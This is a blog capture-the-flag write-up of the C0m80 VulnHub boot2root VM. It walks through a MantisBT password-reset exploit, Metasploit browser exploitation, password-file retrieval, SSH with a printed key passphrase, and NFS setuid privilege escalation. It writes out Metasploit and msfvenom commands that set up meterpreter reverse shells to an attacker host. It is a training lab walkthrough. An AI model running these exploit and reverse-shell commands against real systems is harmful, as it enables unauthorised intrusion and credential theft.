<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the C0m80 VM (Boot2root Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-c0m80-vm-boot2root-challenge/" rel="bookmark"><time class="entry-date published" datetime="2018-02-05T07:50:36+00:00">February 5, 2018</time><time class="updated" datetime="2025-06-10T20:12:26+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends! Today we are going to take another CTF challenge known as C0m80. The credit for making this vm machine goes to “3mrgnc3” and it is another boot2root challenge in which our goal is to get root to complete the challenge. You can download this VM <a style="color: #000000;" href="https://www.vulnhub.com/entry/c0m80-1,198/#download">here</a>.</span></p>
<p><span style="color: #000000;">Let’s Breach!!!</span></p>
<p><span style="color: #000000;">Let us start form getting to know the IP of VM (Here, I have it at 192.168.1.127 but you will have to find your own)</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8o6CfntzbEg/Wnf9HMS-HPI/AAAAAAAAUE0/mCJY0JnQEl4E9Q-IDX9dASGxQ42ifV34ACLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Use nmap for port enumeration</span></p>
<pre class="lang:default decode:true">nmap -A -p- 192.168.1.127</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-kqt4UGHiMYw/Wnf9KSlDaVI/AAAAAAAAUFk/aM7nf-pfdlI5X5l5x8K-6uEHf8vDMp1qwCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">We find that port 80, 111, 139, 445, 2049, 20021, 37196. 40325, 41605, 49418, 58563 are open. As port 80 is running http we open the ip address in our browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-M__NA37S4Jw/Wnf9LOZivgI/AAAAAAAAUFw/4LzupWKJgnYM3MsjjfJ2lSM4CO999T-YgCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">We don’t find anything on the web page so we use dirb to enumerate the directories.</span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.127</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-eaI1WuxKil4/Wnf9NXWo9sI/AAAAAAAAUGU/RLTgz7x1VpM_ytUWzXZYZ37IPtfSqXzUgCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">We find a link to a login page that is running mantis bug report. We find that the version is vulnerable; we can reset the password of the users with this vulnerability. You can read how to exploit this vulnerability <a style="color: #000000;" href="https://www.exploit-db.com/exploits/41890/">here</a>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-oMMqYzydOyc/Wnf9OABsuKI/AAAAAAAAUGk/q3EY2p1MtKYPsj6y4wkdVD-tAbK_gv1UQCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Now we exploit this vulnerability to change the password of the users.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-hR2x6p8H-xg/Wnf9Oi70HSI/AAAAAAAAUGo/Bg34lpl0nVUsmcJpRjB3uYDMizKBhVatwCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">We can change password of all the users present just by changing the id. After changing all the password we find that alice(id=4) is the only account with administrative privileges.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-xUbmIzON2rg/Wnf9OrDtn_I/AAAAAAAAUGs/iFz97wPR7PsVKnbh7wTq24bQJAwi5vQ-QCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Going the mails we find a page that contains a link to a backup file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QDHr7Xyf_Ww/Wnf9O7U8DPI/AAAAAAAAUGw/TNc2p2uubAMcYUBSImBISoYE_XPH9BxCwCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">We download the backup file using wget to get more information about the file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-eBDk2osIY9s/Wnf9POnedNI/AAAAAAAAUG0/lLRqgLv779ok5zdZoJXH9OXSjKcg0Kk2ACLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">After downloading the backup file we find that it is a hexdump, we use this program <a style="color: #000000;" href="https://github.com/Sayantan5/hexdumptoexe">here</a>, to convert it to bin format.</span></p>
<p><span style="color: #000000;">Then we use binwalk to check for for embedded file and binaries and find that there are 2 binaries.</span></p>
<pre class="lang:default decode:true">binwalk ftp.bin</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-JkQKdyOwiwI/Wnf9HogZBFI/AAAAAAAAUE8/Z14QJEBPIsA70vKFcUPKxREpr0XSirZvACLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">We use dd to convert the files into exe and dll, so that we can run the program.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-zL-T4p9rGRM/Wnf9Hcjb5OI/AAAAAAAAUE4/_I3orIIqqAwiAXoOVV685fPP1-VHkv1DgCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Now we run the program and find it’s a program for ftp server.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Y6c58Tmibgs/Wnf9HxlcuCI/AAAAAAAAUFA/rFNuKJmNFmcyXhMgfqKHjhshnOPL31PzACLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">We use netstat to check of ports, and found that port 20021 opened for listening on our system.</span></p>
<pre class="lang:default decode:true">netstat -antp</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-M76yE2r_rRQ/Wnf9ICitNnI/AAAAAAAAUFE/BMELs-s1w5QQlkIaxXNcuD8EuaZjnm3RgCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">We use netcat to connect to the system and find that indeed it is an application for ftpserver.</span></p>
<pre class="lang:default decode:true">nc localhost 20021</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rgWYoFF7few/Wnf9IcLyuFI/AAAAAAAAUFI/AL0dJT0caIA3Cyx0ms3Oj67abEuq7bb-wCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">We now reverse engineer the exe file using ollydbg for more information. And find that when it reads http: it opens the link in the the browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PEHjj8kaymc/Wnf9Isi429I/AAAAAAAAUFM/60SK3sPcsGo_6e668biGI0UeqvyChzHHwCLcBGAs/s1600/15.1.png"/></span></p>
<p><span style="color: #000000;">We use browser autopwn auxiliary to search for vulnerabilities.</span></p>
<pre class="lang:default decode:true">msf &gt; use auxiliary/server/browser_autopwn2
msf auxiliary(server/browser_autopwn2)&gt; set lhost 192.168.1.130
msf auxiliary(server/browser_autopwn2)&gt; run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-_aCXIHD9anI/WngJ8RS4r4I/AAAAAAAAUHs/i-NGfcqOSIwSIPjv3aNLX7OrwGEvlZbSgCLcBGAs/s1600/15.2.png"/></span></p>
<p><span style="color: #000000;">We find that the server can be exploited using firefox_proto_crmrequest, so we setup our listener on metasploit.</span></p>
<pre class="lang:default decode:true">msf &gt; use exploit/multi/browser/firefox_proto_crmfrequest
msf exploit(multi/browser/firefox_proto_crmfrequest) &gt; set lhost 192.168.1.130
msf exploit(multi/browser/firefox_proto_crmfrequest) &gt; set lport 4444
msf exploit(multi/browser/firefox_proto_crmfrequest) &gt; set target 1
msf exploit(multi/browser/firefox_proto_crmfrequest) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(multi/browser/firefox_proto_crmfrequest) &gt; run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-qliQZDePMKk/Wnf9JOHPjoI/AAAAAAAAUFQ/EwK05EMT4UISop7oxNXSpdPVQ_hgY7KqgCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Now we copy the link given by metasploit and use it in the ftp server running on the target machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-EX_GG8MeJ6o/Wnf9JffIoKI/AAAAAAAAUFY/-WspTdBN1RI8cdl7Y9RDEJ_f4cIqLr3kQCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">As soon as we run the command we get our reverse shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VDjKz780B9U/Wnf9JSAKrvI/AAAAAAAAUFU/Jn78fka6QEcHk6BTbhuKvl3ITWZgxgVvACLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Going through the files we get a hint of file that contains all the passwords.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ivnkqyuOqLs/Wnf9Jya45PI/AAAAAAAAUFc/Mb97G_Jh-VgwSFDJj6zgYtZEF-azbJ7twCLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">So we use the search command to find all the files with that name on the server.</span></p>
<pre class="lang:default decode:true">search -f *PWMangr2*</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OcGbi4oTFBo/WngKE1Y7K-I/AAAAAAAAUJc/r26nyluMUKseuwbRyvk_pO0G4fw2BY5AACLcBGAs/s1600/search.png"/></span></p>
<p><span style="color: #000000;">We download the file on our server.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-9F9hgyRgx3s/Wnf9KQdqUUI/AAAAAAAAUFg/ajepjBe0PAwUM6-bzoiEUl5zVGsU4NSXgCLcBGAs/s1600/19.png"/></span></p>
<p><span style="color: #000000;">Now we open the file and find all the passwords.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-kdMs_vmDT9o/Wnf9KpPoVnI/AAAAAAAAUFo/0xSOzxtlyFYGOhHdyzajzTMMcrsW6kyeQCLcBGAs/s1600/20.png"/></span></p>
<p><span style="color: #000000;">Now as the author of the machine states that we can directly access the machine, we go to the server and use the password we find for rdp.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pPLZU2lrwjQ/Wnf9K6xXifI/AAAAAAAAUFs/7iNSB8S3D1w86ydW_FbkL8l_h5NN7kHXACLcBGAs/s1600/29.PNG"/></span></p>
<p><span style="color: #000000;">Now we have access to the machine we find a ssh private key but our nmap scan showed no ssh service running on the server so we take a look at the ssh configuration files and find that the ssh only accepts local connections on port 65122.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-za8t4M26Rj8/Wnf9Lmgoy3I/AAAAAAAAUF0/VdtaVxmMDZkd8sLSat5m3rm4CV6fCD9kACLcBGAs/s1600/30.PNG"/></span></p>
<p><span style="color: #000000;">Now we use the private key we find to login as al1ce, as it is the other account used on this server.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-vmuIvXfO9sE/Wnf9L4Oy0KI/AAAAAAAAUF8/peQv619j1ZggVAwb4hgfi2WhetHpAfmfwCLcBGAs/s1600/31.PNG"/></span></p>
<p><span style="color: #000000;">When we try to login through ssh using the key. We use plink to connect, we get a prompt to unlock the key we use the password we find al1ce (7M6Kt8tC8X5Qz99@Eeb8592Z$Fd@u286) and unlock the private key.</span></p>
<pre class="lang:default decode:true">plink -l al1ce localhost -I id_rsa -P 65122</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-wv9P23_l1Dg/Wnf9L2aRtAI/AAAAAAAAUF4/R-nvMb-QOEg_2HhdqnwsNniMXaUeGjjQACLcBGAs/s1600/32.PNG"/></span></p>
<p><span style="color: #000000;">Now we are login as al1ce.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-zIs9TMiwLm8/Wnf9MRTJrCI/AAAAAAAAUGA/NCA1pCz0BTcoE3lpqq1daoiAfIWgBGXUQCLcBGAs/s1600/33.PNG"/></span></p>
<p><span style="color: #000000;">Now the server is running nfs, so we can use this to upload setuid root binaries.</span></p>
<p><span style="color: #000000;">Now we create a shell using metasploit.</span></p>
<pre class="lang:default decode:true">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.130 lport=4444 -f elf &gt; shell</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JiguNnrB2-Q/Wnf9Mepin-I/AAAAAAAAUGE/2DGLCSWeqEg8ebjoOfNPkLmvQ2yvSeJOgCLcBGAs/s1600/36.png"/></span></p>
<p><span style="color: #000000;">Now we setup our listener using metasploit.</span></p>
<pre class="lang:default decode:true  ">msf &gt; use exploit/multi/handler
msf exploit(multi/handler) &gt; set payload linux/x86/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set lhost 192.168.1.130
msf exploit(multi/handler) &gt; set lport 4444
msf exploit(multi/handler) &gt; set run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-AoXXgGIsGig/Wnf9M0vPN6I/AAAAAAAAUGI/dlAZOYICbdwPWj2ABcaviWOt6HkdxObVwCLcBGAs/s1600/37.png"/></span></p>
<p><span style="color: #000000;">Now we use a script called nsfpysh to interact with nsf, we upload our shell and give him executable permission along with setuid.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-1j6Fwe1FydE/Wnf9M0bsq9I/AAAAAAAAUGM/UXIPtBaCwywPqdcIpzy_uXlK-w4mLhViACLcBGAs/s1600/38.png"/></span></p>
<p><span style="color: #000000;">Now we go to the target machine and run the shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-M5Gr4wkgrhE/Wnf9NK8mjbI/AAAAAAAAUGQ/xYccQGls59kn8RBXfSjnAAv5jOyKElgwgCLcBGAs/s1600/39.PNG"/></span></p>
<p><span style="color: #000000;">As soon as we run the shell, we get the reverse shell as root.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ryvu24t_vqc/Wnf9NhUna_I/AAAAAAAAUGY/SSM0Sf-IW3ov_q13-dagjln30VRd9SA_gCLcBGAs/s1600/40.png"/></span></p>
<p><span style="color: #000000;">Now we find that we are the root user.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-qk0i9woL6v8/Wnf9OE8O5xI/AAAAAAAAUGc/_pkXFDcx4z4vHo5xzhB8_RE0YZ09mGl5ACLcBGAs/s1600/41.png"/></span></p>
<p><span style="color: #000000;">Now we go to the root folder and find the congratulatory flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-sfAXoRjkRAQ/Wnf9OHtqNeI/AAAAAAAAUGg/J4gwRK4_Vwk-rt10ta9Uhbv4SNHRc0fYwCLcBGAs/s1600/42.png"/></span></p>
<p><strong>Author</strong>: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact <a href="https://www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
